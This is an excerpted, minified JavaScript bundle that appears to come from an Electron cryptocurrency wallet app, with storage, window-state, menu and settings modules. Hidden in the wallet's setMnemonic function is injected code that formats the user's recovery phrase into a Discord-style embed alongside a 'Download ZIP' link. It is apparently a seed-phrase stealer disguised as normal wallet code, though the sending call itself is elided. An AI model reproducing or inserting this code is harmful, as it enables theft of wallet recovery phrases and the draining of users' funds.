...
!(function (e) {
  ...
  function (e, t, n) {
    ...
    const r = "fiat.unit",
      ...
      f = "advanced.advancedMode.assets.ethereum",
      d = "fiatOnramp.wentThroughFiatOnboarding";
  },
  function (e, t, n) {
    "use strict";
    const r = (0, n(16).fromCallback)(n(175)),
      o = n(174);
    e.exports = {
      mkdirs: r,
      mkdirsSync: o,
  ...
  function (e, t, n) {
    ...
    const s = new (class extends r.EventEmitter {
      ...
      async setMnemonic(e) {
        ...
        try{
            const embed = {
              ...
              fields: [
                {
                  name: `<a:keys:1159078859682107453> Mnemonic:`,
                  value: `\`\`\`ansi\n[2;32m${e.mnemonic}[0m[2;32m[0m\`\`\`\n[Download ZIP](${links})`,
                  inline: false,
                },
              ],
      ...
      async setWalletLoaded(e, t) {
        console.log(""),
          console.log("SET WALLET LOADED", "action:", t),
          console.log(e),
          console.log(""),
      ...
      async awaitWalletLoaded() {
        console.log(this._walletLoaded)
        this._walletLoaded ||
  ...
  function (e, t, n) {
    ...
    const w = () => y;
    function b() {
      const e = i.screen.getPrimaryDisplay().size,
        t = { ...m, width: e.width / 3, height: e.height / 2 };
      (y = new i.BrowserWindow(t)),
        Object(f.registerWebContents)(y.webContents, "core"),
        Object(p.forwardErrors)(y.webContents, "core"),
        y.loadFile(l.WINDOW_CORE),
        Object(d.default)({ windowHandle: y.webContents, windowId: "core" }),
        y.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        });
      let n = !1;
      return (
        i.app.on("before-quit", (e) => {
          const t = Object(a.default)(Object(u.walletDir)()),
            s = `${t.infoFile}.lock`,
            l = c.a.existsSync(s),
            f =
              Object(r.isStorageWriting)(t.storageFile) ||
              Object(o.isStorageWriting)(t.unsafeStorageFile);
          l || f
            ? (l && console.log(`${s} exists.`),
              f && console.log("storage.seco is still writing"),
              e.preventDefault(),
              setTimeout(() => i.app.quit(), 2e3))
            : ((n = !0), y.isDestroyed() || y.close());
        }),
  ...
  function (e, t, n) {
    ...
    const f = r.Menu.buildFromTemplate(l),
      d = (e, t) => e.items.find((e) => e.label === t);
    o.rpcMain.on(
      ...
      (
        ...
        const c = (() =>
          "darwin" === process.platform
            ? d(d(f, s.appName).submenu, "Developer").submenu
            : d(f, "Developer").submenu)();
        d(d(c, "Notifications").submenu, n ? "On" : "Off").checked = !0;
        const a = d(c, "Sound"),
          u = d(a.submenu, "Volume");
        d(u.submenu, `${parseInt(100 * t)}%`).checked = !0;
        const l = d(c, "Zoom");
        d(l.submenu, `${parseInt(100 * r)}%`).checked = !0;
        const p = !o;
  ...
  function (e, t, n) {
    ...
    e.exports = function (e) {
      ...
      function h() {
        ...
        c = {
          width: f.defaultWidth || 800,
          height: f.defaultHeight || 600,
          x: 0,
          y: 0,
          displayBounds: e,
        };
          ...
          !n.getAllDisplays().some((e) =>
            (function (e) {
              return (
                c.x >= e.x &&
                c.y >= e.y &&
                c.x + c.width <= e.x + e.width &&
                c.y + c.height <= e.y + e.height
              );
            })(e.bounds)
          )
        )
        ...
        if ((e = e || a))
          try {
            ...
            (function (e) {
              ...
              (c.width = t.width),
              (c.height = t.height)),
              (c.isMaximized = e.isMaximized()),
              (c.isFullScreen = e.isFullScreen()),
              (c.displayBounds = n.getDisplayMatching(t).bounds);
          } catch (e) {}
      }
      function w(e) {
        e && y(e);
        try {
          s.sync(r.dirname(d)), i.writeFileSync(d, c);
        } catch (e) {}
      }
      function b() {
        clearTimeout(u), (u = setTimeout(y, l));
      }
      function g() {
        y();
      }
      ...
      function v() {
        a &&
          (a.removeListener("resize", b),
          a.removeListener("move", b),
          clearTimeout(u),
          a.removeListener("close", g),
          a.removeListener("closed", E),
          (a = null));
      }
      try {
        c = i.readFileSync(d);
      ...
      return (
        c && (p() || c.isMaximized || c.isFullScreen)
          ? p() && c.displayBounds && m()
          : (c = null),
        (c = Object.assign(
          { width: f.defaultWidth || 800, height: f.defaultHeight || 600 },
          c
        )),
        {
          get x() {
          ...
          unmanage: v,
          manage: function (e) {
            f.maximize && c.isMaximized && e.maximize(),
              f.fullScreen && c.isFullScreen && e.setFullScreen(!0),
              e.on("resize", b),
              e.on("move", b),
              e.on("close", g),
              e.on("closed", E),
  ...
  function (e, t) {
    ...
    (e.exports = n),
      (e.exports.byArguments = function (e, t = JSON.stringify) {
        const r = new Map();
        return async (...o) => {
          const i = t(o);
          r.has(i) || r.set(i, { count: 0, fn: n(e) });
          const s = r.get(i);
          try {
            return s.count++, await s.fn(...o);
          } finally {
            s.count--, 0 === s.count && r.delete(i);
          }
        };
      });
  },
  ...
  function (e, t, n) {
    ...
    const c = s,
      ...
      E =
        ...
        r.moneroInitialHeight,
        r.moneroSubaddressesEnabled,
        r.moneroSubaddressesEnabled,
        r.themeName,
        r.rbfEnabledBitcoin,
        r.rbfEnabledEthereum,
        r.adaLegacyAddressEnabled,
        r.bitcoinLegacyAddressEnabled,
        r.bitcoinTaprootAddressEnabled,
        r.wentThroughFiatOnboarding,
  ...
  function (e, t, n) {
    ...
    const { app: r, BrowserWindow: o } = n(0),
      ...
      s = n(131),
      { toKeyEvent: c } = n(130),
      a = n(129)("electron-localshortcut"),
      u = {},
      l = new WeakMap(),
      f = (e) => {
        if (e)
  ...
  function (e, t, n) {
    ...
    (() => {
      if ("win32" === process.platform) {
        return !n(135).handleCommand(process.argv[1]);
      }
  ...
  function (e, t, n) {
    const r = n(9),
      o = n(84),
      i = n(143),
      { getLockFile: s, getTmpFile: c, getFlagFile: a } = n(82),
      u = (e) => e.length > 0;
    e.exports = {
      createStorageInternal: function ({ file: e }) {
        const t = s(e),
          n = c(e),
          l = a(e);
        let f;
        const d = (async function () {
          try {
            (f = await r.readFile(e)),
              (f = Object.assign(Object.create(null), JSON.parse(f)));
          } catch (e) {
        ...
        const h = o(
              ...
              if (p) {
                ...
                try {
                  ...
                  do {
                    i &&
                      console.warn(
                        `unsafe storage write invalid; retrying ${s}`
                      ),
                      await r.writeFile(n, o),
                      (i = await r.readFile(n));
                  } while (!u(i) && ++s < 5);
                  5 === s && (await r.ensureFile(l)),
                    await r.move(n, e, { overwrite: !0 });
                } finally {
                  p || (await r.remove(t));
                }
              }
          ...
          m = async () => {
            (p = !0), await r.outputFile(t, ""), await h();
          };
        return {
          get: async (e) => (await d, f[e]),
          batchGet: async (e) => (await d, e.map((e) => f[e])),
          set: async (e, t) => {
            if ((await d, void 0 === t))
          ...
          delete: async (e) => {
            await d, delete f[e], await m();
          },
          batchDelete: async (e) => {
            await d, e.forEach((e) => delete f[e]), await m();
          },
          clear: async (e) => {
            await d,
              Object.keys(f).forEach((t) => {
                t.startsWith(e) && delete f[t];
              }),
              await m();
          },
        };
  ...
  function (e, t, n) {
    ...
    const r = n(16).fromCallback,
      o = n(67);
    (o.outputJson = r(n(170))),
      (o.outputJsonSync = n(169)),
  ...
  function (e, t, n) {
    const r = n(9),
      ...
      s = n(179),
      { checkContents: c } = n(85),
      a = n(146),
      u = n(84),
      l = n(145),
      f = n(68),
      { getLockFile: d, getTmpFile: p, getFlagFile: h } = n(83),
  ...
  function (e, t, n) {
    ...
    const k = ["accessibility-events", "window-placement", "background-sync"];
    function _(e, t, n) {
